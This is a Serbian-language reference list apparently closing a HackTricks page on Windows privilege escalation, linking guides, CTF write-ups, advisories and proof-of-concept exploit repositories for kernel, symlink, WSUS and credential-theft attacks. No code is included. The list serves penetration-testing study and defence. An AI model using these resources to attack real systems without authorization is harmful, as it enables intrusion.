- [6] [Eskalacija privilegija - Windows - Kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje akreditiva hMailServer-a → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format string-a + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog fajl-sistema prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih linkova – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Povratak u prošlost: zloupotreba simboličkih linkova u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js poverenje se ruši: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi kontrolne liste za C/C++, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih fajlova servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: povezivanje CLDFLT-a i DirectX trka u kernelu za LPE u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: primitiva za potpuno čitanje/upisivanje u Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja fajlova za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Kod eksploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Ograničena delegacija zasnovana na Kerberos resursima: kako promena slike dovodi do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje SSH privatnih ključeva iz SSH agenta u Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrikе backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje tragovima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Bezbednosno obaveštenje o eskalaciji privilegija putem pomeranja offseta deljene memorije u Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
